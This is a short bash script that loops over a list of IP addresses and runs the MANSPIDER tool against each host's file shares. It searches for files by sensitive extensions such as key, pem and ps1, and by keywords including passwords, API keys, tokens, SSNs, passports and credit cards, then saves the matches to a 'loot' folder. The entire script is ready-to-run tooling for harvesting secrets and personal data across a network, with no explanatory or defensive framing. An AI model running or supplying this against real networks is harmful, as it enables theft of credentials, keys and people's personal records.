#!/bin/bash

IP_FILE="spider-hosts.txt"

LOOT_DIR="$HOME/manspider_loot"

FILE_EXTENSIONS="txt doc docx xls xlsx csv db bat com vbs ps1 psd1 psm1 pem key rsa pub reg cfg conf"
KEYWORDS="passw user admin account network login logon api_key access_key token cred SSN passport social_security drivers_license creditcard credit_card certificate pem ssh vpn classified confidential internal_use_only"

mkdir -p "$LOOT_DIR"

if [ ! -f "$IP_FILE" ]; then
    echo "File not found: $IP_FILE"
    exit 1
fi

while IFS= read -r ip; do
    manspider -t 20 $ip -l "$LOOT_DIR" -f "$KEYWORDS" -e "$FILE_EXTENSIONS"
done < "$IP_FILE"

echo "MANSPIDER search completed. Loot saved to $LOOT_DIR"
